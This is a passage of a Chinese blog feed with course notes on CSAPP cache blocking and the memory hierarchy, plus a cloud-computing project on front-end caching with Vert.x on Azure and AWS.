<p><img src="/images/14556334394809.jpg" alt=""></p>
<h3 id="u5229_u7528_blocking__u63D0_u9AD8_temporal_locality"><a href="#u5229_u7528_blocking__u63D0_u9AD8_temporal_locality" class="headerlink" title="利用 blocking 提高 temporal locality"></a>利用 blocking 提高 temporal locality</h3><p>还是矩阵相乘的例子，先看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="keyword">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmm</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b, <span class="keyword">double</span> *c, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                c[i*n + j] += a[i*n + k] * b[k*n + j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们假设矩阵的元素是 double，缓存的每个 line 可以容纳 8 个 double，整个缓存的大小 C 远小于 n。</p>
<p>对应的访问模式为：</p>
<p><img src="/images/14556337275150.jpg" alt=""></p>
<p>进行计算的时候，对于矩阵 a，因为是一行一行读取的，在读取第一个 double 的时候，后面 7 个也会被载入缓存（miss 数目为 n/8），但是对于矩阵 b，因为是一列一列读取的，所以每次都需要更新缓存（miss 数目为 n）</p>
<p><img src="/images/14556342437811.jpg" alt=""></p>
<p>所以总的 miss 数目为：$\frac{9n}{8}\times n^2=\frac{9}{8}n^3$</p>
<p>但是如果我们把矩阵分成一块一块来计算，就会有不一样的效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="keyword">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmm</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b, <span class="keyword">double</span> *c, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> i1, j1, k1;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i+=B)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j+=B)</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k+=B)</span><br><span class="line">            <span class="comment">/* B x B mini matrix multiplications */</span></span><br><span class="line">                <span class="keyword">for</span> (i1 = i; i1 &lt; i+B; i1++)</span><br><span class="line">                    <span class="keyword">for</span> (j1 = j; j1 &lt; j+B; j1++)</span><br><span class="line">                        <span class="keyword">for</span> (k1 = k; k1 &lt; k+B; k1++)</span><br><span class="line">                            c[i1*n+j1] += a[i1*n+k1] * b[k1*n + j1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是如下图所示：</p>
<p><img src="/images/14556343880865.jpg" alt=""></p>
<p>这里我们加一个条件，假设缓存中可以放下 3 个 Block，即 $3B^2 &lt; C$。</p>
<p><img src="/images/14556347788350.jpg" alt=""></p>
<p>那么在计算的时候，这三个 Block 其实都可以放到缓存中。对于每个 Block 来说，一共有 $B^2$ 个元素，8 个元素会 miss 一次，所以一共会 miss $\frac{B^2}{8}$ 次。而一次完整的计算（指算完整行乘以整列），矩阵 a 和 b 都需要读入 $\frac{n}{B}$ 个 block，所以总的 miss 数目是 $\frac{2n}{B}\times \frac{B^2}{8} = \frac{nB}{4}$（这里的 2n 是因为矩阵 a 和 b 各有 n/B 个 Block）。</p>
<p>而对于整个矩阵 c 来说，一共有 $(\frac{n}{B})^2$ 个 block，所以整个计算过程的 miss 数目为：</p>
<p>$$\frac{nB}{4}\times (\frac{n}{B})^2 = \frac{n^3}{4B}$$</p>
<p>比较一下，一个是 $\frac{9}{8} n^3$，另一个是 $\frac{1}{4B} n^3$，有巨大的差异！，但是需要保证的就是 $3B^2 &lt; C$（所以需要针对机器进行调整）</p>
<p>总结下</p>
<ul>
<li>Cache memories 对性能会有极大的影响</li>
<li>写代码的时候可以考虑<ul>
<li>关注内循环，尤其是访问元素的顺序和方向</li>
<li>以 stride 1 的顺序来访问可以最大化 spatial locality</li>
<li>尽可能多利用读入的数据（重复使用）来最大化 temporal locality</li>
</ul>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>上一讲我们了解了存储的相关知识，这节课我们来更加深入研究一下 cache memory 的知识。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="组成原理" scheme="http://wdxtub.com/tags/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
      <category term="缓存" scheme="http://wdxtub.com/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 第 11 课 Memory Hierarchy]]></title>
    <link href="http://wdxtub.com/2016/02/15/csapp-11/"/>
    <id>http://wdxtub.com/2016/02/15/csapp-11/</id>
    <published>2016-02-15T15:13:51.000Z</published>
    <updated>2016-02-18T04:27:39.000Z</updated>
    <content type="html"><![CDATA[<p>从这一讲开始我们会介绍有关存储的知识（估计前面的汇编已经看得够呛了吧），个人的感觉来说会稍微轻松一些，但是概念比较多，一定要弄清楚再继续。</p>
<a id="more"></a>
<hr>
<h2 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h2><p>按照 Sheldon 的做法，我们当然要从历史说起，了解存储设备所用的技术以及发展趋势，对我们理解内存层级背后的原因很有帮助。</p>
<p>RAM(Random-Access Memory) 有两种类型：SRAM(Static RAM) 和 DRAM(Dynamic RAM)，SRAM 非常快，也不需要定期刷新，通常用在处理器做缓存，但是比较贵；DRAM 稍慢一点（大概是 SRAM 速度的十分之一），需要刷新，通常用作主内存，相比来说很便宜（是 SRAM 价格的百分之一）。</p>
<p>无论是 DRAM 还是 SRAM，一旦不通电，所有的信息都会丢失。如果想要让数据持久化，可以考虑 ROM, PROM, EPROM, EEPROM 等介质。固件程序会存储在 ROM 中（比如 BIOS，磁盘控制器，网卡，图形加速器，安全子系统等等）。另外一个趋势就是 SSD 固态硬盘，取消了机械结构，更稳定速度更快更省电。</p>
<h2 id="u786C_u76D8"><a href="#u786C_u76D8" class="headerlink" title="硬盘"></a>硬盘</h2><p>传统的机械硬盘有许多不同的部件：</p>
<p><img src="/images/14555548218373.jpg" alt=""></p>
<p>虽然现在越来越多电脑已经改为使用固态硬盘，但是还是有必要了解一下硬盘的组成的。首先需要知道是，机械硬盘有许多片 platter 组成，每一片 platter 有两面；每一面由一圈圈的 track 组成，而每个 track 由 gap 分隔成不同的 sector。这里概念层层递进，可以结合下图仔细辨析清楚。</p>
<p><img src="/images/14555549124076.jpg" alt=""></p>
<p>上图是一个 platter 的视图，多个 platter 组合起来是这样的：</p>
<p><img src="/images/14555550788288.jpg" alt=""></p>
<p>硬盘的容量指的是最大能存储的比特数，通常用 GB 来做单位。1 GB 相当于 10 的 9 次方个 Byte。与硬盘的结构分层类似，容量取决于下面三个方面：</p>
<ul>
<li>记录密度(bits/in)：track 中 1 英寸能保存的字节数</li>
<li>Track 密度(tracks/in)：1 英寸直径能保存多少条 track</li>
<li>Areal 密度(bits/in 的平方)：上面两个数值的乘积</li>
</ul>
<p><img src="/images/14555611007547.jpg" alt=""></p>
<p>现在硬盘会把相邻的若干个 track 切分成小块，每一块叫做 recording zones。 recording zone 中的每个 track 都包含同样数量的 sector；但是每个 zone 中包含的 sector 和 track 的数目是不一样的，外层的更多，内层的更少；正因为如此，我们计算容量是，用的是平均的数值。</p>
<p>容量 Capacity = (# bytes/sector) x (avg. # sectors/track) x (# tracks/surface) x (# surfaces/platter) x (# platters/disk)</p>
<p>举个例子，假如一个硬盘有：</p>
<ul>
<li>512 bytes/sector</li>
<li>300 sectors/track (平均)</li>
<li>20000 tracks/surface</li>
<li>2 surfaces/platter</li>
<li>5 platters/disk</li>
</ul>
<p>总的容量为 = 512 x 300 x 20000 x 2 x 5 = 30,720,000,000 = 30.72 GB</p>
<p>具体的工作模式大概是这样的：</p>
<p><img src="/images/14555616594586.jpg" alt=""></p>
<p><img src="/images/14555616894770.jpg" alt=""></p>
<p>假设我们现在已经从蓝色区域读取完了数据，接下来需要从红色区域读，首先需要寻址，把读取的指针放到红色区域所在的 track，然后等待磁盘旋转，旋转到红色区域之后，才可以开始真正的数据传输过程。</p>
<p>总的访问时间  Taccess =  寻址时间 Tavg seek + 旋转时间 Tavg rotation + 传输时间 Tavg transfer</p>
<ul>
<li>寻址时间 Tavg seek 因为物理规律的限制，一般是 3-9 ms</li>
<li>旋转延迟 Tavg rotation 取决于硬盘具体的转速，一般来说是 7200 RPM</li>
<li>传输时间 Tavg tranfer 就是需要读取的 sector 数目</li>
</ul>
<p>举个例子，假设转速是 7200 RPM，平均寻址时间 9ms，平均每个 track 的 sector 数目是 400，那么我们有：</p>
<ul>
<li>Tavg rotation = 1/2 x (60 secs / 7200 RPM) x 1000 ms/sec = 4 ms</li>
<li>Tavg transfer = 60 / 7200 RPM x 1/400 secs/track x 1000 ms/sec = 0.02 ms</li>
<li>Taccess = 9 ms + 4 ms + 0.02 ms</li>
</ul>
<p>从这里可以看出，主要决定访问时间的是寻址时间和旋转延迟；读取一个 sector 的第一个 bit 是非常耗时的，之后的都几乎可以忽略不计；硬盘比 SRAM 慢 40,000 倍，比 DRAM 慢 2500 倍。</p>
<p>最后需要知道的就是逻辑分区和实际的物理分区的区别，为了使用方便，会用连续的数字来标志所有可用的 sector，具体的映射工作由磁盘控制器完成。</p>
<p>接下来介绍一下固态硬盘，大概的结构如下：</p>
<p><img src="/images/14555629267132.jpg" alt=""></p>
<p>固态硬盘中分成很多 Block，每个 Block 又有很多 Page（大约 32-128 个），每个 Page 可以存放一定数据（大概 4-512KB），进行数据读写的最小单位，就是 Page，但是有一点需要注意，对一个 Page 进行写入操作的时候，需要先把整个 Block 清空（设计限制），而一个 Block 大概在 100,000 次写入之后就会报废。</p>
<p><img src="/images/14555634433688.jpg" alt="Intell SSD 730 产品规格"></p>
<p>与传统的机械硬盘相比，固态硬盘在读写速度上有很大的优势。但是因为设计本身的约束，连续访问会比随机访问快，而且如果需要写入 Page，那么需要移动其他 Page，擦除整个 Block，然后才能写入。现在固态硬盘的读写速度差距已经没有以前那么大了，但是仍然有一些差距。</p>
<p>不过与机械硬盘相比，固态硬盘存在一个具体的寿命限制，价格也比较贵，但是因为速度上的优势，越来越多设备开始使用固态硬盘。</p>
<h2 id="u603B_u7EBF"><a href="#u603B_u7EBF" class="headerlink" title="总线"></a>总线</h2><p>总线是用来传输地址、数据和控制信号的一组平行的电线，通常来说由多个设备共享，类似于不同城市之间的高速公路，可以传输各类数据。CPU 通过总线和对应的接口来从不同的设备中获得所需要的数据，放入寄存器中等待运算，像下面这样：</p>
<p><img src="/images/14555626366163.jpg" alt=""></p>
<p>假设 CPU 需要从硬盘中读取一些数据，会给定指令，逻辑块编号和目标地址，并发送给磁盘控制器。然后磁盘控制器会读取对应的数据，并通过 DMA(direct memory access)把数据传输到内存中；传输完成后，磁盘控制器通过 interrupt 的方式通知 CPU，然后 CPU 完成之后的工作。</p>
<p>总线上连接的各个设备，其访问速度有天壤之别，不同的技术发展速度不同，更加剧了这个情况：</p>
<p><img src="/images/14555636595434.jpg" alt=""></p>
<p>比方说磁盘的读写速度，30 年大概只提高了一个数量级多一点，所以固态硬盘的出现，以下拯救了劳苦大众（提高了两个数量级），DRAM 的发展，一路从 DDR12345 发展来，速度大概提高了一个数量级，不过 SRAM 则是在同一个起点愣是多跑了一个数量级，总体来说是跟着 CPU 的发展走的。不过 CPU 的发展在 2003 年也遇到了问题（单个核心基本到极限），不过多核的出现以及技术优化，总体来说还是使得执行速度越来越快。</p>
<p>那么这么大的时间差距，怎么办呢？难道根据木桶理论，都要取决于最慢的那个吗？不一定！Locality 可以在一定程度上拯救世界。</p>
<h2 id="Locality"><a href="#Locality" class="headerlink" title="Locality"></a>Locality</h2><p>Locality 的思路很简单，就是如果一个数据最近被访问过，很可能还会被再次访问：</p>
<ul>
<li>Temporal locality: Recently referenced items are likely to be referenced again in the near future</li>
<li>Spatial locality: Items with nearby addresses tend to be referenced close together in time</li>
</ul>
<p>举个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    sum += a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure>
<p>这里每次循环都会访问 <code>sum</code>，是 temporal locality；而访问数组是连续访问的，是 spatial locality。</p>
<p>根据这个特性，在写遍历数组的时候（尤其是高维），尤其要注意按照内存排列顺序来访问，不然性能会惨不忍睹。</p>
<h2 id="Memory_Heirarchy"><a href="#Memory_Heirarchy" class="headerlink" title="Memory Heirarchy"></a>Memory Heirarchy</h2><p>一种介质的速度越快，就会越贵，同时也消耗更多的电量，所以一般容量比较小。而 CPU 和内存之间的速度差距越来越大，所以好的程序都会尽可能利用 locality。根据这些特性，也就引申出了一个安排存储的方式，称为 memory hierarchy。</p>
<p><img src="/images/14555647586566.jpg" alt=""></p>
<p>这里就涉及到一个技术：缓存。缓存可以看作是把大且缓慢的设备中的数据的一部分拿出来存储到其中的更快的存储设备。在 memory hierarchy 金字塔中，每一层都可以看作是下一层的缓存。利用 locality，程序会更倾向于访问第 k 层的数据，而非第 k+1 层，这样就减少了访问时间。</p>
<p><img src="/images/14555654345569.jpg" alt=""></p>
<blockquote>
<p>The memory hierarcy creates a large pool of storage that costs as much as the cheap storage near the bottom, but that serves data to programs at the rate of the fast storage near the top.</p>
</blockquote>
<p><img src="/images/14555650316337.jpg" alt=""></p>
<p>在上图中，假如程序请求的是 10，那么 10 正好在缓存中，即 cache hit，就可以节约时间。但是如果程序请求的是 12，因为 12 不在缓存中，即 cache miss，就必须从内存中获取，并替换缓存中的某个数据（具体替换哪一个，由 placement policy 和 replacement policy 决定）</p>
<h3 id="Cache_Miss"><a href="#Cache_Miss" class="headerlink" title="Cache Miss"></a>Cache Miss</h3><p>Cache miss 有三种：</p>
<ul>
<li>Cold(compulsory) Miss: CPU 第一次访问相应 cache 块，cache 中肯定没有该 cache 块，这是不可避免的</li>
<li>Confilict Miss: 在直接相联或组相联的 cache 中，不同的 cache 块由于 index 相同相互替换，引起的失效叫做冲突失效<ul>
<li>假设这里有 32KB 直接相联的 cache</li>
<li>如果有两个 8KB 的数据需要来回访问，但是这两个数组都映射到相同的地址，cache 大小足够存储全部的数据，但是因为相同地址发生了冲突需要来回替换，发生的失效则全都是冲突失效（第一次访问失效依旧是强制性失效），这时 cache 并没有存满</li>
</ul>
</li>
<li>Capacity Miss: 有限的 cache 容量导致 cache 放不下而被替换出 cache 块，被替换出去的 cache 块再被访问，引起的失效叫做容量失效<ul>
<li>假设这里有 32KB 直接相联的 cache</li>
<li>如果有一个 64KB 的数组需要重复访问，数组的大小远远大于 cache 大小，没办法全部放入 cache。第一次访问数组发生的失效全都是强制性失效。之后再访问数组，再发生的失效则全都是容量失效，这时 cache 已经存满，容量不足以存储全部数据</li>
</ul>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>从这一讲开始我们会介绍有关存储的知识（估计前面的汇编已经看得够呛了吧），个人的感觉来说会稍微轻松一些，但是概念比较多，一定要弄清楚再继续。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="内存层级" scheme="http://wdxtub.com/tags/%E5%86%85%E5%AD%98%E5%B1%82%E7%BA%A7/"/>
    
      <category term="组成原理" scheme="http://wdxtub.com/tags/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[云计算 第 13 课 缓存]]></title>
    <link href="http://wdxtub.com/2016/02/15/cc-13/"/>
    <id>http://wdxtub.com/2016/02/15/cc-13/</id>
    <published>2016-02-15T11:04:35.000Z</published>
    <updated>2016-02-16T03:22:48.000Z</updated>
    <content type="html"><![CDATA[<p>前面我们已经了解了如何进行 autoscaling 和自定义负载均衡器，这一课我们来接触另一个在 web 服务中非常重要的概念——缓存。</p>
<a id="more"></a>
<hr>
<h2 id="u5B66_u4E60_u76EE_u6807"><a href="#u5B66_u4E60_u76EE_u6807" class="headerlink" title="学习目标"></a>学习目标</h2><ol>
<li>了解在 web 服务中缓存所扮演的角色</li>
<li>比较影响缓存的两个方面：temporal locality 和 spatial locality</li>
<li>部署一个使用缓存的 web 服务</li>
<li>比较不同的缓存策略对性能的影响</li>
</ol>
<p>先来看看数据格式，保存在 data center 中的数据格式是：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">targetID</span><span class="params">(数字)</span></span>, first_name, last_name, encrypted <span class="function"><span class="title">data</span><span class="params">(文本)</span></span></span><br></pre></td></tr></table></figure>
<p>而客户端（在这里就是 load generator）发给 data center 的数据格式是：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Target <span class="tag">&lt;<span class="title">targetID</span>&gt;</span> first_name last_name’s encrypted conversations are: <span class="tag">&lt;<span class="title">conversations</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>每个 data center 在同一时间大概能够缓存 10000 条记录，但是面对 load generator 仍然有些力不从心，我们的任务就是利用缓存来提高性能。</p>
<p>不少互联网应用都需要大量的资源，提高性能的方法很多，其中一个就是我们之前尝试过的 horizontal 和 vertical scaling。这种方式虽然比较方便，但是贵呀，能不能在已有资源限制的情况下，尽可能提高性能呢？两个比较常见的办法是『缓存(caching)』和『复制(replication)』。</p>
<p>复制、缓存和负载均衡可以在不对数据进行分割的情况下提高性能。很多工具（比如 Varnish, Squid, memcached）可以完成缓存这项任务，把最常用的资源保存下来。这样有两个好处：</p>
<ol>
<li>系统不必重复运算，节约计算资源</li>
<li>可以快速向用户返回结果</li>
</ol>
<p>另外一个比较常见的方法是『复制』，通常会与缓存结合使用。系统会保存多个全部数据集的副本，这样系统可以同时访问多个不同资源。使用『复制』方法的时候，需要注意以下几点：</p>
<ol>
<li>需要确定一个分配用户请求的策略，可以是内容相关的（即特定请求会重定向至特定机器）或者是内容无关的</li>
<li>『复制』的实例本身需要实时监控，避免出现负载不均衡的问题</li>
<li>在进行内容写入的时候，还需要保证数据一致性（但是在这次的作业中不要求）</li>
</ol>
<p>这周我们要处理的系统，后端有两个『复制』的数据库。除了可以应对大负载，某种程度上来说也提高了容错性（比如说数据库损坏）。任何时候，只有一个实例在运行，都是很危险的。具体的架构见下图：</p>
<p><img src="/images/14555365484111.jpg" alt="图 A，从数据库中获取数据；图 B，从前端缓存中获取数据"></p>
<p>说明以下上图的例子，前端访问数据库需要 1 ms(单向)，从数据库中获取数据需要 10 ms，而直接访问前端获取一次数据需要 2 ms(单向)，同一条记录，如果没有缓存，那么一共需要 16ms 来完成整个操作，而如果有缓存，则只需要 4 ms。</p>
<ul>
<li>Temporal locality: 假如一条记录刚刚被用到，那么很可能之后也会被常用到</li>
<li>Spatial locality: 假如一条记录刚刚被用到，那么很可能它附近的几条记录也会被用到</li>
</ul>
<p>另外一个需要注意的是，除了前端这个显式缓存，无论是数据库还是文件系统都会有自己的缓存系统，比方说 data center 会缓存最近的 10000 条记录，我们访问一条没有在前端缓存的记录时，如果它已经被 data center 缓存，那么整个可能寻找数据只需要 6 ms(而不是之前的 10 ms)。</p>
<p>注意事项</p>
<ul>
<li>用 Java 写，Azure 部分就有 100% 的分数，提交的代码中不要出现：    <code>Appid</code>, <code>appkey</code>, <code>storage account key</code> 和 <code>endpoint url</code></li>
<li>最多只能在前端存储 1000 条记录</li>
<li>做 AWS 的部分记得打上 <code>Project : 2.3</code> 的标签</li>
</ul>
<p>系统镜像 Azure</p>
<ul>
<li>Data Center, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23dcv5-osDisk.dc552bc1-518d-451e-b856-c0419a6adcdb.vhd</code></li>
<li>Load Generator, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23lgv4-osDisk.40d2443e-9f8c-41ce-9826-e0d7792a6c27.vhd</code></li>
<li>前端, <code>Standard_A0</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23fe-osDisk.8d5f0df8-c94d-43e0-8a11-77ba440e0d8f.vhd</code></li>
</ul>
<p>系统镜像 AWS</p>
<ul>
<li>Data Center, <code>m3.medium</code>, <code>ami-1b193371</code></li>
<li>Load Generator, <code>m3.medium</code>, <code>ami-c00134aa</code></li>
<li>前端, <code>m3.medium</code>, <code>ami-6f2a1f05</code></li>
</ul>
<h2 id="u7F13_u5B58_u6D4B_u8BD5"><a href="#u7F13_u5B58_u6D4B_u8BD5" class="headerlink" title="缓存测试"></a>缓存测试</h2><p>研究 trace file 来确定缓存的策略。Data Center 各可以缓存 10000 条记录，并提供以下接口：</p>
<ul>
<li><code>/target?targetID=X</code> 返回结果并缓存</li>
<li><code>/range?start_range=X&amp;end_range=Y</code> 缓存一个范围内的结果（以 <code>;</code> 分隔）并缓存</li>
</ul>
<h3 id="u4EFB_u52A1_u5217_u8868"><a href="#u4EFB_u52A1_u5217_u8868" class="headerlink" title="任务列表"></a>任务列表</h3><ol>
<li>启动一个 <code>Standard_A0</code> 虚拟机作为前端</li>
<li>SSH 到前端，账户 <code>ubuntu</code> 密码 <code>Cloud@123</code></li>
<li>文件夹 <code>vertx</code> 中有 <code>MSB.java</code> 和 <code>run_vertx.sh</code></li>
<li>熟悉 <code>MSB.java</code> 中的代码</li>
<li>启动两个 <code>Standard_D1</code> 虚拟机作为 data center</li>
<li>在 <code>MSB.java</code> 文件中，把两个 data center 的 DNS 填写进去，格式为 <code>xxx.eastus.cloudapp.azure.com</code></li>
<li>修改 <code>retrieveDetails</code> 函数，提高性能，现在代码已经是可以运行的，可以运行来体验下整个过程 </li>
<li>可以在前端机器上存储 1000 条记录以提高性能。具体用什么数据结构和载入策略都可以自己决定。唯一的限制就是不能超出 1000 条的上限。</li>
<li>改动完成后可以用下面的命令启动 web 服务：<code>./run_vertx.sh</code></li>
<li>确定代码没有问题后，可以开启一个 <code>Standard_D1</code> 虚拟机作为 load generator，在浏览器中访问其 DNS 就可以看到界面</li>
<li>提交密码和 andrew id</li>
<li>填写前端 DNS 地址以开始 Trace 1 测试，目标是 145 RPS</li>
<li>填写前端 DNS 地址以开始 Trace 2 测试，目标是 145 RPS</li>
<li>填写前端 DNS 地址以开始 MSB Trace 测试，目标是 145 RPS </li>
<li>测试的时候可以在浏览器里查看日志</li>
</ol>
<h3 id="u63D0_u793A"><a href="#u63D0_u793A" class="headerlink" title="提示"></a>提示</h3><ul>
<li>研究清楚 web 服务的代码再开启 load generator 和 data center</li>
<li>可以随意修改 <code>MSB.java</code>，唯一需要注意的是不能缓存超过 1000 条记录</li>
<li>统计系统中的不同组件的延迟来找出哪里更加需要优化</li>
<li>了解 temporal locality 和 spatial locality，思考如何可以在代码中利用这两个特性</li>
<li>开始 MSB Trace Test 之前确保已经通过了前两个测试</li>
<li>执行 <code>run_vertx.sh</code> 之后，可以使用 <code>sudo cat nohup.out</code> 来查看日志</li>
<li>前两个测试可以通过观察请求中的 id 来进行策略设计，但 MSB Trace 测试需要更加复杂的缓存机制</li>
<li>我们手头上有两台数据相同的 data center，各有不同的缓存，想想如何利用这个特点来提高效率（不同的请求发送给不同的主机，需要分类）</li>
<li>了解同步和异步请求的概念，data center 提供 web 服务对数据库进行异步请求，看看这部分代码是怎么实现的</li>
<li>这里只会对数据库进行读取，所以不需要考虑数据一致性的问题</li>
<li>只需要提交 MSB Trace Test 的代码，把所有代码放到一个 zip 包里，用 load generator 提交</li>
<li>每当 cache 有 miss 的时候，输出一下，找找规律</li>
</ul>
<p><strong>参考资料</strong></p>
<ul>
<li>Rabinovich, Michael, and Oliver Spatscheck. Web caching and replication. Boston, USA: Addison-Wesley…”</li>
<li><a href="http://www.cs.berkeley.edu/~brewer/Giant.pdf" target="_blank" rel="external">Brewer, Eric A. “Lessons from giant-scale services.” Internet Computing, IEEE 5.4 (2001): 46-55</a></li>
<li><a href="http://www.distributed-systems.net/papers/2007.ic.pdf" target="_blank" rel="external">Sivasubramanian, Swaminathan, et al. “Analysis of caching and replication strategies for web applications.” Internet Computing, IEEE 11.1 (2007): 60-66</a></li>
<li><a href="http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf" target="_blank" rel="external">Karger, David, et al. “Consistent hashing and random trees: Distributed caching protocols for relieving hot spots on the World Wide Web.” Proceedings of the twenty-ninth annual ACM symposium on Theory of computing. ACM, 1997</a></li>
<li><a href="http://www.cs.cmu.edu/~hl/papers/loadbal-socc2011.pdf" target="_blank" rel="external">Fan, Bin, et al. “Small cache, big effect: Provable load balancing for randomly partitioned cluster services.” Proceedings of the 2nd ACM Symposium on Cloud Computing. ACM, 2011</a></li>
</ul>
<h3 id="AWS__u90E8_u5206"><a href="#AWS__u90E8_u5206" class="headerlink" title="AWS 部分"></a>AWS 部分</h3><p>这一部分是选做的，基本要求一样，有以下需要注意的的：</p>
<ul>
<li>安全组中要打开 80 端口</li>
<li>AWS 的地址格式和 Azure 的稍有不同</li>
<li>性能的要求是 142 RPS</li>
</ul>
<h2 id="u9879_u76EE_u65E5_u5FD7"><a href="#u9879_u76EE_u65E5_u5FD7" class="headerlink" title="项目日志"></a>项目日志</h2><p>首先可以直接利用上个项目的代码，用指定的镜像开好四个机器，检查一下是否开机成功，都没问题之后，就可以 ssh 到我们的 Front End 机器：<code>ssh ubuntu@yourdns.eastus.cloudapp.azure.com</code>，然后把所有文件都复制下来方便本地修改：<code>scp -r ubuntu@yourdns.eastus.cloudapp.azure.com:~/vertx/* ./</code>，里面还是有不少文件的，不过我们这次只需要修改一个 <code>MSB.java</code>。</p>
<p>先来看看具体我们要做什么，观察 <code>MSB.java</code>，会发现这次处理请求的实现方式和之前都不一样，留意以下这一段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vertx.createHttpServer().requestHandler(<span class="keyword">new</span> Handler&lt;HttpServerRequest&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpServerRequest req)</span> </span>&#123;</span><br><span class="line">        String query_type = req.path();</span><br><span class="line">        req.response().headers().set(<span class="string">"Content-Type"</span>, <span class="string">"text/plain"</span>);</span><br><span class="line">        <span class="keyword">if</span>(query_type.equals(<span class="string">"/target"</span>)) &#123;</span><br><span class="line">            String key = req.params().get(<span class="string">"targetID"</span>);</span><br><span class="line">            processRequest(key,req);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (query_type.equals(<span class="string">"/range"</span>)) &#123;</span><br><span class="line">            String start = req.params().get(<span class="string">"start_range"</span>);</span><br><span class="line">            String end = req.params().get(<span class="string">"end_range"</span>);</span><br><span class="line">            processRequest(start, end, req);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).listen(<span class="number">80</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到这里在 80 端口打开了一个监听器，每次遇到请求，就会调用其中的 <code>handle(HttpServerRequest req)</code> 函数，那么这个函数里做了什么事情呢？</p>
<ol>
<li>根据不同的请求类型，执行不同的请求</li>
